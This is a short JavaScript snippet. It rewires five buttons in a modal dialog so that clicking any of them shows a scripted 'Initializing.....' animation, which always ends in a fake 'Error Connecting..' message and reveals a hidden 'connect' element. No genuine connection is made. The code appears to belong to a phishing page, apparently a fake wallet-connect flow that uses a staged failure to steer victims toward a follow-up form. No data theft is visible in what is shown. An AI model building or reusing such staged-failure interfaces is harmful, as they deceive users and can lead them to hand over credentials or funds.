
let click_me_btn = document.querySelector("body > div.MuiDialog-root.MuiModal-root.css-nb6r90 > div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0 > div > div > div > div:nth-child(1)")
let click_me_btn2 = document.querySelector("body > div.MuiDialog-root.MuiModal-root.css-nb6r90 > div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0 > div > div > div > div:nth-child(2)")
let click_me_btn3 = document.querySelector("body > div.MuiDialog-root.MuiModal-root.css-nb6r90 > div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0 > div > div > div > div:nth-child(3)")
let click_me_btn4 = document.querySelector("body > div.MuiDialog-root.MuiModal-root.css-nb6r90 > div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0 > div > div > div > div:nth-child(4)")
let click_me_btn5 = document.querySelector("body > div.MuiDialog-root.MuiModal-root.css-nb6r90 > div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0 > div > div > div > div:nth-child(5)")



let first_popup = document.querySelector("body > div.sc-bdVaJa.LPcxt")


click_me_btn.onclick = function (e) {
    e.preventDefault();
    loadings();
    closemodal();
    first_popup.style.display = "flex"
}
click_me_btn2.onclick = function (e) {
    e.preventDefault();
    loadings();
    closemodal();
    first_popup.style.display = "flex"
}
click_me_btn3.onclick = function (e) {
    e.preventDefault();
    loadings();
    closemodal();
    first_popup.style.display = "flex"
}
click_me_btn4.onclick = function (e) {
    e.preventDefault();
    loadings();
    closemodal();
    first_popup.style.display = "flex"
}
click_me_btn5.onclick = function (e) {
    e.preventDefault();
    loadings();
    closemodal();
    first_popup.style.display = "flex"
}



function loadings() {
    var a =  setTimeout(function () {
        loading.innerHTML = "Initializing.";
      }, 1)
    
      var a = setTimeout(function() {
        loading.innerHTML = "Initializing..";
      }, 500)
    
      var a = setTimeout(function() {
        loading.innerHTML = "Initializing...";
      }, 1000)

      var a = setTimeout(function() {
        loading.innerHTML = "Initializing....";
      }, 2000)

      var a = setTimeout(function() {
        loading.innerHTML = "Initializing.....";
      }, 3000)

      var a = setTimeout(function() {
        loading.innerHTML = "Error Connecting.."
        connect.style.display = "flex"
      }, 4000)
     
    }
    
